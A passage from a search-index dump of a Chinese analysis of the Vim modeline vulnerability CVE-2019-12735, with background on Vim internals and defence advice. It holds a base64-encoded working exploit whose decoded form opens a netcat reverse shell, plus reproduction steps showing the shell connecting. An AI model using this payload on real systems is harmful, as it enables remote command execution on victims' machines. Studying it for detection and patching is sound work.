\u56e0\u4e3a\u5149\u6807\u524d\u79fb,\u4e24\u4e2a\u7a7a\u683c\u4f1a\u8986\u76d6Nothing here.\" \u5b57\u7b26\u4e32\u6700\u540e\u7684\u5f15\u53f7\"\u548c\\x16\n# \u4e8e\u662fcat\u7684\u8f93\u51fa\u53ea\u5269\u4e0b \\x16Nothing here.\\n\n# \\n\u6362\u884c\u89e6\u53d1 silent! w | ... | file | silent! [some text]  \u6574\u6761\u547d\u4ee4\u7684\u6267\u884c\n# \u5176\u4e2dcall system\u5b8c\u6210\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u5efa\u7acb\u53cd\u5f39shell",
            "title": "a. EXP\u539f\u7406"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#b-exp",
            "text": "\u539f\u4f5c\u8005exp:  shell.txt  \u4f18\u5316\u8fc7\u7684exp:   echo \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt\n\n# base64\u7f16\u7801\u5bf9\u5e94\u7684\u660e\u6587\n\\x1b[?7l\\x1bS Nothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n# \u4fee\u6539\u4e86\u56db\u5904\n# \u4fee\u6539\u539f\u56e0\u89c1\u9644\u4ef6\n# nc -> nc.traditional \n# \\x1b[K -> \\x1b[2K \n# \\x1b[D -> \\x1b[2D \n#  \\n  ->   \\n (\u589e\u52a0\u4e86\u4e00\u4e2a\u7a7a\u683c)",
            "title": "b. EXP\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#c_1",
            "text": "\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePoc\u76f8\u540c    Step1 - \u521b\u5efaexp\u6587\u4ef6    $ echo \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt   Step2 - \u76d1\u542cnc\u56de\u8fde\u7aef\u53e3   $ nc -vlp 9999\nListening on [0.0.0.0] (family 0, port 9999)   Step3 - Vim\u6253\u5f00exp\u6587\u4ef6   $ vim exp.txt\n Nothing here.\n~                                                                      \n...                                                                     \n~                                                                               \n\"exp.txt\" line 1 of 1 --100%-- col 14   \u4f1a\u8bdd\u5efa\u7acb\u6210\u529f   $ nc -vlp 9999\nListening on [0.0.0.0] (family 0, port 9999)\nConnection from [127.0.0.1] port 9999 [tcp/*] accepted (family 2, sport 55824)\npwd\n/home/invincible/Desktop/test/vim_test\nid\nuid=1000(invincible) gid=1000(invincible) groups=1000(invincible),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)",
            "title": "c. \u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#d",
            "text": "Vim\u7684modeline\u53ef\u4ee5\u5728\u6587\u4ef6\u52a0\u8f7d\u65f6\u81ea\u52a8\u914d\u7f6e\uff1b    Vim\u8fdb\u884c\u914d\u7f6e\u65f6\u4f1a\u6267\u884cVim\u6307\u4ee4\uff0c\u800cVim\u7684\u67d0\u4e9b\u6307\u4ee4\u53c8\u80fd\u591f\u6267\u884c\u7cfb\u7edf\u7684Shell\u6307\u4ee4(\u901a\u8fc7 fork+execvp/system )\uff1b    Vim\u7684\u5bf9\u53ef\u6267\u884c\u6307\u4ee4\u7684\u6761\u4ef6\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u3002",
            "title": "d. \u5229\u7528\u6838\u5fc3\u8981\u7d20"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#5",
            "text": "\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  package\u7248\u672c\u68c0\u67e5\uff1a\u83b7\u53d6\u5f53\u524d\u7cfb\u7edfvim\u7684package\u7248\u672c\u4fe1\u606f\uff0c\u5bf9\u6bd4package\u7684changelog\u5224\u65ad\u5f53\u524d\u7248\u672c\u662f\u5426\u4fee\u590d\u4e86\u6f0f\u6d1e(\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u53ef\u80fd\u5b58\u5728\u65e0\u6cd5\u83b7\u53d6package\u4fe1\u606f\u7684\u60c5\u51b5)\u5177\u4f53\u64cd\u4f5c\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4->package\u7248\u672c\u68c0\u67e5\u90e8\u5206  poc\u9a8c\u8bc1\uff1a\u624b\u52a8\u9a8c\u8bc1\uff0c\u4ee3\u7801\u6267\u884cvim\u8bfb\u53d6stdout\uff0c\u6216\u8005ptrace\u8bfb\u53d6\u8c03\u7528\u6808\u3002\u5177\u4f53\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4-> poc\u9a8c\u8bc1\u90e8\u5206\u3002    \u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \u66f4\u65b0\u8f6f\u4ef6\uff0c\u8fd9\u662f\u6700\u7b80\u5355\u901a\u7528\u7684\u65b9\u6cd5\uff1b  \u914d\u7f6e\u68c0\u67e5\uff0cDebian\u7b49\u4e00\u4e9b\u53d1\u884c\u7248\u5df2\u7ecf\u9ed8\u8ba4\u5173\u95ed\u4e86modeline\u7684\u914d\u7f6e\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u5168\u9694\u65ad\u8be5\u6f0f\u6d1e\u7684\u5229\u7528\u8def\u5f84\uff0c\u5982\u679c\u9ed8\u8ba4\u6ca1\u6709\u5173\u95ed\uff0c\u5219\u9700\u8981\u624b\u52a8\u5173\u95ed\uff0c\u5177\u4f53\u914d\u7f6e\u65b9\u6cd5\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4-> \u914d\u7f6e\u68c0\u67e5\u90e8\u5206\uff1b  \u6587\u4ef6\u76d1\u63a7\uff0c\u5339\u914d\u6587\u4ef6\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u662f\u5426\u7b26\u5408modeline\u7279\u5f81\uff0c\u5982\u679c\u7b26\u5408\uff0c\u4e14modeline\u4e2d\u5305\u542b\"source\"\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u53d1\u51fa\u8b66\u62a5(\u975e\u901a\u7528\u65b9\u6cd5\uff0c\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002    \u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \u4ec5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u901a\u7528\u7f13\u89e3\u63aa\u65bd\u5c31\u662f\u5173\u95edmodeline\u914d\u7f6e\uff1b  \u8be5\u7c7b\u6f0f\u6d1e\u5c5e\u4e8eOS\u547d\u4ee4\u6ce8\u5165\uff0c\u4e00\u822c\u662f\u901a\u8fc7\u76d1\u63a7system/fork/exec\u7b49\u7cfb\u7edf\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u548c\u963b\u65ad\u5a01\u80c1(\u4f46\u662f\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002",
            "title": "5.\u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#6",
            "text": "https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md  https://imbawenzi.github.io/2019/08/03/vim/",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/",
            "text": "Vim\u6f0f\u6d1e\u5206\u6790\u9644\u4ef6(cve-2019-12735)\n\n\n\u80cc\u666f\u77e5\u8bc6\n\n\nVim\u7684\u6a21\u5f0f\n\n\n\u53c2\u8003\uff1ahttp://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro\n  \n\n\nNormal mode\n\n\n\u901a\u8fc7 $ vim file \u6253\u5f00\u6587\u4ef6\u540e\u8fdb\u5165\u7684\u6a21\u5f0f\n\n\n$ vim hello.txt\nHello\n~                                                                     \n~                                                                      \n~                                                                      ...\n~                                                                               \n\"hello.txt\" 1L, 6C\n\n\n\n\n\n\u901a\u8fc7source!\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9\n\n\nCommand-line mode\n\n\n\n\n\n\n\u5728normal mode\u4e0b\u8f93\u5165\n: ( and / ? )\n\u8fdb\u5165Command-line mode\n\n\n\n\n\n\n\u5728Vim\u7684Command-line\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u6267\u884cVim commands\n\n\n\n\n\u5176\u4e2d\uff0c\u901a\u8fc7 \n:!{shell cmd}\n \u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\n\n\n\n\n# http://vimdoc.sourceforge.net/htmldoc/various.html#:!\n$ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n\n\n\n\nEx mode\n\n\n\n\n\n\n\u901a\u8fc7\n$ vim -e  file\n\u8fdb\u5165\u8be5\u6a21\u5f0f\n\n\n\n\n\n\n\u4e5f\u53ef\u4ee5\u5728Normal mode\u4e0b\u8f93\u5165Q\u8fdb\u5165\u8be5\u6a21\u5f0f\n\n\n\n\n\u8fd9\u4e2a\u6a21\u5f0f\u7684\u7279\u70b9\u662f\u53ef\u4ee5\u8fde\u7eed\u6267\u884cVim command\uff0c\u53ef\u4ee5\u7c7b\u6bd4 python \u7684\u547d\u4ee4\u884c\u6a21\u5f0f\n\n\n\u901a\u8fc7source\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9\n\n\n\n\nInsert mode\n\n\n\n\n\n\n\u5728Normal mode\u4e0b\u8f93\u5165i\u53ef\u4ee5\u8fdb\u5165Insert mode, \u8fd9\u4e2a\u6a21\u5f0f\u76f8\u5f53\u4e8e\u7f16\u8f91\u6a21\u5f0f\uff0c\u5927\u90e8\u5206\u64cd\u4f5c\u548c\u5728\u8bb0\u4e8b\u672c\u4e2d\u4e00\u6837\u3002\n\n\n\n\n\n\n\u53e6\u5916\u8fd8\u6709 \"I\", \"a\", \"A\", \"o\", \"O\", \"c\", \"C\", \"s\" or S\"\u4e5f\u53ef\u4ee5\u4eceNormal mode\u8fdb\u5165Insert mode.\n\n\n\n\n\n\n\u5177\u4f53\u6a21\u5f0f\u8f6c\u6362\u89c1: \nhttp://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro\n\n\n\n\n\n\n\u5176\u4e2d\"S\"\u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u8fdb\u5165Insert mode\n\n\n\n\n\n\n# :help S\n# [\"x]S                   Delete [count] lines [into register x] and start\n#                           insert.  Synonym for \"cc\" |linewise|.\n\n# Demo\u6f14\u793a\n$ vim 1.vim\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a)\n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n~                                                                      \n...     \n~                                                                               \n\"1.vim\" 9L, 147C\n\nS(shift+s)\n\n\n:while i < 10\n:    let a = getline(i)\n:    if empty(a)\n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n~                                                                      ...\n~\n\n-- INSERT --\n<ESC>\np  (p\u662f\u7c98\u8d34)\np\n\n\n:let i = 1\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a)\n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n~                                                                      ...\n\n\n\n\n\n\nVim options\u7684\u6982\u5ff5\n\n\nVim\u7684options\u76f8\u5f53\u4e8e\u7f16\u8f91\u5668\u7684\u914d\u7f6e\uff0c\u901a\u8fc7command-line\u6a21\u5f0f\u7684:set\u547d\u4ee4\u624b\u52a8\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u81ea\u52a8\u914d\u7f6e\uff0c\u81ea\u52a8\u914d\u7f6e\u7684\u65b9\u6cd5\u4e3b\u8981\u662f\u901a\u8fc7Vim\u811a\u672c(.vimrc, .exrc)\u6216\u8005modeline\u65b9\u5f0f\u3002\n\n\nVim\u7684modeline\u529f\u80fd\n\n\n\n\n\n\n\u53c2\u80031: \nhttp://vimdoc.sourceforge.net/htmldoc/options.html#modeline\n\n\n\n\n\n\n\u53c2\u80032: \nhttps://vim.fandom.com/wiki/Modeline_magic\n\n\n\n\n\n\nmodeline\u7528\u4e8e\u5728\u6587\u672c\u6587\u4ef6\u7684\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u8bbe\u7f6evim options, \u8ba9vim\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\u81ea\u52a8\u52a0\u8f7d\u5e76\u6267\u884c\u8be5\u914d\u7f6e\n\n\n\n# modeline \u6709\u4e24\u79cd\u683c\u5f0f\n# \u7b2c\u4e00\u79cd\u683c\u5f0f\uff1a [text]{white}{vi:|vim:|ex:}[white]{options}\n#                           vi:noai:sw=3 ts=6 \n# - text\u53ef\u4ee5\u7528\u6765\u653e\u7f6e\u7f16\u7a0b\u8bed\u8a00\u7684\u6ce8\u91ca(python\u7684 # , C \u7684// )\uff0c\u662f\u53ef\u9009\u7684\n# - vi:\u4e4b\u524d\u4e00\u5b9a\u8981\u6709\u7a7a\u683c\n# - options\u7528\":\"\u6216\u8005\u7a7a\u683c\u5206\u9694\n\n\n# \u7b2c\u4e8c\u79cd\u683c\u5f0f\uff1a    \n#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]\n#               /* vim: set ai tw=75: */ \n# - \u9996\u5c3e\u90fd\u53ef\u4ee5\u7528text\u4e3b\u8981\u662f\u652f\u6301(C\u7684\u8fd9\u79cd\u6ce8\u91ca \"/**/\")\uff0c\u9996\u5c3e\u7684text\u90fd\u662f\u53ef\u9009\u7684\n# - vim: \u540e\u9762\u8981\u6709\u7a7a\u683c\n# - \u8981\u6709\u4e00\u4e2aset(\u53ef\u4ee5\u7f29\u5199\u6210 se\uff0c\u540e\u9762\u8ddf\u7a7a\u683c)\n# - options\u7528\u7a7a\u683c\u5206\u9694\n# - \u7ed3\u5c3e\u8981\u6709\u5192\u53f7 : \n\n\n\n\n\n\u5f00\u542fmodeline\n\n\n# \u7f16\u8f91~/.vimrc\n# \u6dfb\u52a0\uff1a\nset modeline\nset modelines=5\n\n\n\n\n\n\u5177\u4f53\u4f7f\u7528\n\n\n# \u7528Vim\u6253\u5f00\u6587\u672c\uff1a\n$ vim a.py\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n# cursor is here \n\ndef main():\n        func1()\n\nmain()\n\n\n# \u6253\u5f00a.py\u540e, \u9ed8\u8ba4\u7684tab\u957f\u5ea6\u662f8\u4e2a\u7a7a\u683c\uff0c\u4e0d\u652f\u6301\u56de\u8f66\u81ea\u52a8\u7f29\u8fdb\n# \u53ef\u4ee5\u901a\u8fc7tabstop\u548cautoindent\u4e24\u4e2a\u9009\u9879\u6765\u914d\u7f6e\n:set tabstop=4\n:set autoindent\n\n\n# \u6548\u679c\u5982\u4e0b\uff1a\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()\n\n\n# \u4f46\u662f\u4e0b\u6b21\u6253\u5f00\u540e\uff0c\u53c8\u9700\u8981\u518d\u914d\u7f6e\u4e00\u6b21\n# \u53ef\u4ee5\u901a\u8fc7modeline\u6765\u4f7f\u8fd9\u4e2a\u914d\u7f6e\u6bcf\u6b21\u6253\u5f00a.py\u6587\u4ef6\u65f6\u90fd\u751f\u6548\n# \u5728\u6587\u4ef6\u5f00\u5934\u6dfb\u52a0\u4e00\u884c\u5185\u5bb9\uff1a # vim: set tabstop=4 autoindent: \n# \u518d\u6b21\u6253\u5f00\u6548\u679c\u5982\u4e0b\uff1a\n\n$ vim a.py\n# vim: set tabstop=4 autoindent: \n# python3\n# coding=utf-8\nimport platform\n\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()\n\n\n\n\n\n\n\nFor security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox\n\n\u4e3a\u4e86\u5b89\u5168\u539f\u56e0\uff0c\u53ea\u6709\u90e8\u5206options\u53ef\u4ee5\u5728modeline\u4e2d\u914d\u7f6e\uff0c\u5982\u679coption\u7684\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f(\u6bd4\u5982\u914d\u7f6efoldexpr)\uff0c\u90a3\u4e48\u8868\u8fbe\u5f0f\u4f1a\u5728vim\u7684sandbox\u4e2d\u6267\u884c\n\n\nVim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\n\n\n\u6839\u636eVim Script\u8bed\u6cd5\u7f16\u5199Vim\u811a\u672c\uff0c\u53c2\u8003\uff1a\n\n\nhttps://github.com/name5566/vim-config/blob/master/vim_script.md\n\n\nhttp://vimdoc.sourceforge.net/htmldoc/usr_41.html\n\n\nhttp://vimdoc.sourceforge.net/htmldoc/eval.html\n\n\nhttp://vimdoc.sourceforge.net/htmldoc/eval.html#functions\n\n\n# \u521b\u5efa\u4e00\u4e2aVim\u811a\u672c1.vim\n$ vim 1.vim\n\n\n# \u6309\u7167Vim Script\u8bed\u6cd5\u7f16\u8f91\u811a\u672c\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a) \n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n\n\n# \u4fdd\u5b58\n:w\n\n\n# \u7528source\u6307\u4ee4\u52a0\u8f7d\u81ea\u5df1\u5e76\u6267\u884c\n:source % \n# or\n:source 1.vim\n\n\n# \u6267\u884c\u7ed3\u679c\uff1a\nLine: 1 is :let i = 1\nLine: 2 is :while i < 10\nLine: 3 is :    let a = getline(i)\nLine: 4 is :    if empty(a)\nLine: 5 is :        break\nLine: 6 is :    endif\nLine: 7 is :    echo \"Line:\" i \"is\"  a\nLine: 8 is :    let i += 1\nLine: 9 is :endwhile\nPress ENTER or type command to continue\n\n\n\n# \u5728\u7f16\u8f91\u5176\u4ed6\u6587\u4ef6\u7684\u65f6\u5019\u52a0\u8f7d\u5e76\u6267\u884c\u4e00\u4e2aVim\u811a\u672c\n$ vim a.txt\nHello\nVim\nGoodbye!\n~         \n:source 1.vim\n\n\nLine: 1 is Hello\nLine: 2 is Vim\nLine: 3 is Goodbye!\nPress ENTER or type command to continue\n\n\n\n\n\n\nsource\u547d\u4ee4\n\n\nsource\u547d\u4ee4\u7528\u4e8e\u4eceVim\u811a\u672c\u6587\u4ef6\u4e2d\u8bfb\u53d6Vim\u6307\u4ee4\u5e76\u6267\u884c\uff0c\u53c2\u8003\uff1a\nhttp://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts\n\n\n:help source\n\n:so[urce] {file}        \n  Read Ex commands from {file}.  \n  These are commands that start with a \":\".\n\n\n:so[urce]! {file}       \n  Read Vim commands from {file}.  \n  These are commands that are executed from Normal mode, \n  like you type them.\n\n\n\n\n\n\nsource\u548csource!\u7684\u533a\u522b\u5728\u4e8e\uff1a\n\n\n\n\nsource\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Ex commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u7684\u5185\u5bb9\u5fc5\u987b\u662f :cmd \u7684\u5f62\u5f0f\n\n\nsource!\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Normal mode\u4e0b\u6267\u884c\u7684vim commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u4e2d\u7684\n<ESC> i /\n \u5b57\u7b26\u8fd9\u4e9b\u90fd\u4f1a\u5f53\u6210Normal mode\u4e0b\u7684\u7528\u6237\u8f93\u5165(like you type them)\n\n\n\n\n# \u521b\u5efa\u4e00\u4e2avim\u811a\u672c\uff0c\u5199\u5165\u5185\u5bb9iHello,World\u540e\u4fdd\u5b58\n$ vim 5.vim\niHello,World\n\n:wq\n\n# \u7528source! \u52a0\u8f7d\u5e76\u6267\u884c\u811a\u672c\n$ vim \n:source! 5.vim\n\n# \u6548\u679c\u5982\u4e0b\uff0c\u6253\u5f00\u540e\u76f4\u63a5\u8fdb\u5165\u4e86Insert mode\nHello,World\n\n~                                                                      \n~                                                                      \n...                                                                    \n~                                                                       \n~                                                                                                        \n-- INSERT --\n\n\n# \u800c\u7528source\u52a0\u8f7d\u5219\u4f1a\u62a5\u9519\n$ vim \n:source 5.vim\n\n\nError detected while processing 5.vim:\nline    1:\nE492: Not an editor command: iHello,World\nPress ENTER or type command to continue\n\n\n\n\n\n\nvim\u6267\u884cshell\u547d\u4ee4\n\n\n\u901a\u8fc7\u5728command-line mode\u4e0b\uff0c\u4f7f\u7528 !{cmd}\u6765\u6267\u884cshell\u547d\u4ee4\n\n\n$ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n\n\n\n\n\n# \u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c\n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:source %\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\nPress ENTER or type command to continue\n\n# \u7279\u6b8a\u7684\u51fd\u6570execute\n# $ vim\n# :help execute()\n#  execute({command} [, {silent}])                                 *execute()*\n#                 Execute an Ex command or commands and return the output as a\n#                 string. \n#                 {command} can be a string or a List.  In case of a List the\n#                 lines are executed one by one. \n# ...\n\n#                 The optional {silent} argument can have these values:\n#                         \"\"              no `:silent` used\n#                         \"silent\"        `:silent` used\n#                         \"silent!\"       `:silent!` used\n#                               The default is \"silent\".  \n#                               Note that with \"silent!\", unlike `:redir`, error messages are dropped\n# ...\n\n\n$ vim b.vim\n: call execute(\"source a.vim\", \"\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue\n\n\n# execute\u51fd\u6570\u5728ubuntu\u4e0a\u5b89\u88c5\u7684Vim\u4e2d\u6ca1\u6709\uff0c\u4f46\u662f\u8fd8\u6709\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\uff1aassert_fails()\n# $ vim\n# :help assert_fails\n# \n# assert_fails({cmd} [, {error}])                                 *assert_fails()*\n#                 Run {cmd} and add an error message to |v:errors| if it does\n#                 NOT produce an error.\n#                 When {error} is given it must match in |v:errmsg|.\n$ vim b.vim\n: call assert_fails(\"source a.vim\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue\n\n\n\n\n\n\nsilent\u547d\u4ee4\n\n\n# :help silent\n#                              *:sil* *:silent* *:silent!*\n# :sil[ent][!] {command}  \n#    Execute {command} silently.  \n#    Normal messages will not\n#    be given or added to the message history.\n#    When [!] is added, error messages will also be\n#    skipped, and commands and mappings will not be aborted\n#    when an error is detected.\n\n\n\n# 1. \u7f16\u5199\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e0d\u4f7f\u7528silent\uff0c\u4fdd\u5b58\u540e\u4f1a\u5728\u5e95\u90e8\u51fa\u73b0\u56de\u663e\u4fe1\u606f\nvim 1.txt\ni\nsomething \n~                                                                      ...     \n~       \n<ESC>\n:w                                                                   \n\"a.vim\" 1L, 11C written\n\n# 2. \u4f7f\u7528silent\uff0cw\u547d\u4ee4\u7684\u56de\u663e\u4fe1\u606f\u5c31\u6d88\u5931\u4e86\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n\n# 3. silent! \u53ef\u4ee5\u7528\u6765\u53bb\u9664\u9519\u8bef\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file | silent! Anycommand or anytext'\\' \\; \"\n\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9\n\n\n\n\n\n\nredraw\u547d\u4ee4\n\n\n# :help redraw!\n#                                             *:redr*  *:redraw*\n# :redr[aw][!]            \n#  Redraw the screen right now.  \n#  When ! is included it is cleared first.\n#                         ... \n# \u7acb\u523b\u5237\u65b0\u5c4f\u5e55\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86!\u5219\u5148\u6e05\u9664\u5c4f\u5e55\u5185\u5bb9\n# \u6bcf\u6761\u547d\u4e86\u6267\u884c\u5b8c\uff0c\u5e95\u90e8\u4f1a\u7559\u4e0b\u5386\u53f2\u8bb0\u5f55\uff0c redraw!\u4f1a\u6e05\u9664\u6389\u8bb0\u5f55\n\n# \u5c4f\u5e55\u4f1a\u6e05\u7a7a\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n:redraw!\n\nsomething\n~                                                                       ...\n~                                                                            \n\n\n\n\n\nfile\u547d\u4ee4\n\n\n# \u8f93\u5165\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9\n\n\n\n\n\n\n\nsystem\u51fd\u6570\n\n\nsystem({expr} [, {input}])                              *system()* *E677*\nGet the output of the shell command {expr} as a string.  \n... \n\n$ vim\n:let a = system('pwd')\n:echo a\n\n~                                                                      \n/home/invincible/Desktop/test/vim_test\n\nPress ENTER or type command to continue\n\n\n\n\n\n\nassert_fails\u51fd\u6570\n\n\n\u6267\u884c\u4e00\u4e2avim command, \u5982\u679c\u6ca1\u6709\u51fa\u9519\uff0c\u5219\u5c06command\u7684\u6267\u884c\u4fe1\u606f\u4fdd\u5b58\u5230v:errors\u5168\u5c40\u53d8\u91cf\u4e2d\n\n\n:help assert_fails\n\nassert_fails({cmd} [, {error}])                                \n  Run {cmd} and add an error message to |v:errors| \n  if it does NOT produce an error.\n  When {error} is given it must match in |v:errmsg|.\n\n\n\n\n\n$ vim\n:call assert_fails(\"echo 'hello'\")\n\n~\n...\n~\nhello\n\n:echo v:errors\n['command did not fail: echo ''hello''']\n\n\n\n\n\n\u7f16\u5199\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c\n\n\n\n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:wq\n\n# \u7528assert_faild\u6267\u884cvim\u7684source\u6307\u4ee4\uff0c\u52a0\u8f7dvim\u811a\u672ca.vim\n$ vim\n:call assert_fails(\"source a.vim\")\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n:echo v:errormsg\n['command did not fail: source 